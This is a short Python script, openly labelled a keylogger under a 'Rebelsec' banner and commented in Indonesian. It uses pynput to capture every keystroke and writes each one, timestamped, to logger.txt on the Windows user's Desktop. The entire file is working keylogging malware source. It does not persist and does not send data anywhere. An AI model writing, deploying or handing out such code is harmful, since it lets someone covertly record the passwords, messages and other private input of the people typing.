from pynput.keyboard import Listener
import os
import logging
from shutil import copyfile

print("""

Keylogger By :
 ____      _          _
|  _ \ ___| |__   ___| |___  ___  ___
| |_) / _ \ '_ \ / _ \ / __|/ _ \/ __|
|  _ <  __/ |_) |  __/ \__ \  __/ (__
|_| \_\___|_.__/ \___|_|___/\___|\___|

Running succesfully ....
""")

# dapatin nama username komputer nya
username = os.getlogin()
# lokasi keylogger
direktori_keylogger = f"C:/Users/{username}/Desktop"
# proses keylogger
logging.basicConfig(
    filename=f"{direktori_keylogger}/logger.txt", level=logging.DEBUG, format="%(asctime)s : %(message)s :")


def key_handler(key):  # fungsi key handler
    logging.info(key)


with Listener(on_press=key_handler) as listener:
    listener.join()
